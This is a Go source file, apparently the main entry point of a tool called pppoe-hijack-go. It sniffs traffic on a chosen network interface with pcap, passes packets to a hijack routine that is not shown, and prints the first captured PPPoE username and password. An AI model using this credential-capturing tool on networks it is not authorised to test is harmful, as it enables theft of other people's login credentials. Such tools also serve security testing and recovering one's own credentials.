package main

import (
	"flag"
	"fmt"
	"github.com/LuckyC4t/pppoe-hijack-go/internal/actions"
	"github.com/LuckyC4t/pppoe-hijack-go/internal/global"
	"github.com/LuckyC4t/pppoe-hijack-go/internal/utils"
	"github.com/google/gopacket"
	"github.com/google/gopacket/pcap"
	"log"
	"time"
)

func main() {
	flag.StringVar(&global.Device, "i", "", "network interface")
	show := flag.Bool("l", false, "list net interfaces")
	flag.Parse()

	if global.Device == "" && !*show {
		flag.Usage()
		return
	}

	if *show {
		utils.ShowInterfaces()
		return
	}
	// Open device
	handle, err := pcap.OpenLive(global.Device, 1024, false, -1*time.Second)
	if err != nil {
		log.Fatal(err)
	}
	global.Handle = handle
	defer handle.Close()

	// Use the handle as a packet source to process all packets
	fmt.Println("start sniffing...")
	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
	for packet := range packetSource.Packets() {
		if packetPayload := actions.Hijack(packet); packetPayload != nil {
			fmt.Println("---------------------------------------")
			fmt.Println("username:", packetPayload[0])
			fmt.Println("password:", packetPayload[1])
			fmt.Println("---------------------------------------")
			break
		}
	}
}
